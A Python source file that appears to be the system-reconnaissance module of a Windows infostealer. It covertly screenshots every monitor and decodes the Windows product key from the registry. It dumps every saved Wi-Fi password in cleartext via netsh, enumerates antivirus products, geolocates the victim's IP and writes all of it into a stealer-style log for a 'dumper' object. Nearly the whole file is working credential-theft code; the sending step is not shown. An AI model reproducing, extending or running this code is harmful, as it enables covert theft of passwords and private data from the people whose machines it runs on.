import os
import platform
import psutil
import subprocess
import winreg
import ctypes
import requests
from datetime import datetime
import tempfile

try:
    import mss
    HAS_MSS = True
except ImportError:
    HAS_MSS = False


def get_product_key():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
        value, _ = winreg.QueryValueEx(key, "DigitalProductId")
        winreg.CloseKey(key)

        digits = "BCDFGHJKMPQRTVWXY2346789"
        key_bytes = bytearray(value[52:67])
        product_key = ""

        for i in range(24, -1, -1):
            cur = 0
            for j in range(14, -1, -1):
                cur = (cur * 256) ^ key_bytes[j]
                key_bytes[j] = cur // 24
                cur %= 24
            product_key = digits[cur] + product_key
            if (25 - i) % 5 == 0 and i != 25:
                product_key = "-" + product_key

        return product_key
    except Exception:
        return "Not Found"


def get_screens(dumper):
    if not HAS_MSS:
        return

    try:
        with mss.mss() as sct:
            for i, monitor in enumerate(sct.monitors[1:], 1):
                img = sct.grab(monitor)
                filepath = os.path.join(tempfile.gettempdir(), f"screen_{i}.png")
                mss.tools.to_png(img.rgb, img.size, output=filepath)
                dumper.save_image(filepath, "System")
                try:
                    os.unlink(filepath)
                except Exception:
                    pass
    except Exception:
        pass


def get_system_full(dumper):
    username = os.getenv("USERNAME", "Unknown")
    hostname = os.getenv("COMPUTERNAME", "Unknown")
    user_host = f"{username}@{hostname}"

    try:
        users = [
            d for d in os.listdir("C:\\Users")
            if os.path.isdir(f"C:\\Users\\{d}") and d not in ["Public", "Default", "All Users", "Default User"]
        ]
        users_list = "\n".join(users) if users else "None"
    except Exception:
        users_list = "Error"

    os_full = "Microsoft Windows"
    ver = platform.win32_ver()
    if ver[0]:
        os_full += f" {ver[0]}"
    if ver[1]:
        os_full += f" {ver[1]}"
    if "10" in platform.release() and int(platform.version().split('.')[2]) >= 22000:
        os_full = os_full.replace("10", "11")

    cpu = platform.processor() or "Unknown"

    try:
        gpu_output = subprocess.check_output(
            "wmic path win32_VideoController get name", text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        ).splitlines()
        gpu = next((line.strip() for line in gpu_output if line.strip() and "Name" not in line), "Unknown")
    except Exception:
        gpu = "Unknown"

    ram_gb = f"{psutil.virtual_memory().total / (1024**3):.2f} GB"

    try:
        mac = next(
            (addr.address for iface, addrs in psutil.net_if_addrs().items()
             for addr in addrs if addr.family == psutil.AF_LINK and addr.address != "00:00:00:00:00:00"),
            "Unknown"
        )
    except Exception:
        mac = "Unknown"

    try:
        hwid_output = subprocess.check_output(
            "wmic csproduct get uuid", text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        ).splitlines()
        hwid = next((line.strip() for line in hwid_output if line.strip() and "UUID" not in line), "Unknown")
    except Exception:
        hwid = "Unknown"

    product_key = get_product_key()

    disks_lines = ["Drive Free Total Use"]
    try:
        for part in psutil.disk_partitions():
            if 'cdrom' in part.opts or not part.fstype:
                continue
            try:
                usage = psutil.disk_usage(part.mountpoint)
                free_gb = int(usage.free / (1024**3))
                total_gb = int(usage.total / (1024**3))
                used_pct = int(usage.used / usage.total * 100)
                drive = part.device.rstrip('\\').ljust(6)
                free_str = str(free_gb).ljust(6)
                total_str = str(total_gb).ljust(6)
                line = f"{drive} {free_str}GB {total_str}GB {used_pct}%"
                disks_lines.append(line)
            except Exception:
                continue
    except Exception:
        disks_lines.append("Error reading disks")

    try:
        net = requests.get("http://ip-api.com/json", timeout=10).json()
        ip = net.get("query", "N/A")
        country = net.get("country", "N/A")
        region = net.get("regionName", "N/A")
        city = net.get("city", "N/A")
        postal = net.get("zip", "N/A")
        isp = net.get("isp", "N/A")
        as_num = net.get("as", "N/A")
        lat = net.get("lat", "N/A")
        lon = net.get("lon", "N/A")
    except Exception:
        ip = country = region = city = postal = isp = as_num = lat = lon = "N/A"

    wifi_lines = []
    try:
        profiles = subprocess.check_output(
            "netsh wlan show profiles", text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        networks = [
            line.split(":", 1)[1].strip()
            for line in profiles.splitlines()
            if "Tous les utilisateurs" in line or "All User Profile" in line
        ]
        for net in networks:
            try:
                out = subprocess.check_output(
                    f'netsh wlan show profile name="{net}" key=clear', text=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                key = next(
                    (l.split(":", 1)[1].strip() for l in out.splitlines()
                     if "Contenu de la cl" in l or "Key Content" in l),
                    None
                )
                wifi_lines.append(f"{net} | {key or 'None'}")
            except Exception:
                wifi_lines.append(f"{net} | Error")
    except Exception:
        wifi_lines = ["Not Found"]

    file_location = os.path.abspath(__file__)

    try:
        import locale
        lang = locale.windows_locale.get(ctypes.windll.kernel32.GetUserDefaultUILanguage(), "Unknown")
    except Exception:
        lang = "Unknown"

    try:
        user32 = ctypes.windll.user32
        screen = f"{{Width={user32.GetSystemMetrics(0)}, Height={user32.GetSystemMetrics(1)}}}"
    except Exception:
        screen = "N/A"

    try:
        tz = subprocess.check_output(
            'powershell -Command "[System.TimeZoneInfo]::Local.Id"', text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        ).strip()
    except Exception:
        tz = "N/A"

    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")
        uac_val = winreg.QueryValueEx(key, "EnableLUA")[0]
        uac = "AllowAll" if uac_val == 1 else "Restricted"
        winreg.CloseKey(key)
    except Exception:
        uac = "N/A"

    elevation = "True" if ctypes.windll.shell32.IsUserAnAdmin() else "False"
    log_date = datetime.now().strftime("%m/%d/%Y %I:%M:%S %p")

    try:
        import win32api
        keyboard = "French (France)" if "0000040C" in win32api.GetKeyboardLayoutName() else "Unknown"
    except Exception:
        keyboard = "Unknown"

    try:
        av_out = subprocess.check_output(
            'wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName',
            text=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        antivirus = "\n".join([l.strip() for l in av_out.splitlines() if l.strip() and "displayName" not in l]) or "None"
    except Exception:
        antivirus = "Windows Defender"

    disks_section = "\n".join(disks_lines)
    wifi_section = "\n".join(wifi_lines) if wifi_lines != ["Not Found"] else "Not Found"

    report = f"""============================================================
 SYSTEM INFORMATION - {user_host}
============================================================
[USER]
Username: {username}
Hostname: {hostname}
Users: {users_list}
[SYSTEM]
OS: {os_full}
CPU: {cpu}
GPU: {gpu}
RAM: {ram_gb}
MAC: {mac}
HWID: {hwid}
Product Key: {product_key}
FileLocation: {file_location}
Current Language: {lang}
ScreenSize: {screen}
TimeZone: {tz}
UAC: {uac}
Process Elevation: {elevation}
Log date: {log_date}
Available KeyboardLayouts:
{keyboard}
Hardwares:
Name: {cpu} , {psutil.cpu_count(logical=False)} Cores
Name: {gpu}, {psutil.virtual_memory().total} bytes
Name: Total of RAM, {ram_gb} or {psutil.virtual_memory().total} bytes
Anti-Viruses:
{antivirus}
[DISKS]
{disks_section}
[NETWORK]
IP: {ip}
Country: {country}
Region: {region}
Postal: {postal}
City: {city}
ISP: {isp}
AS: {as_num}
Latitude: {lat}
Longitude: {lon}
[WIFI]
{wifi_section}
"""

    dumper.save("system_full.txt", report.strip(), "System")
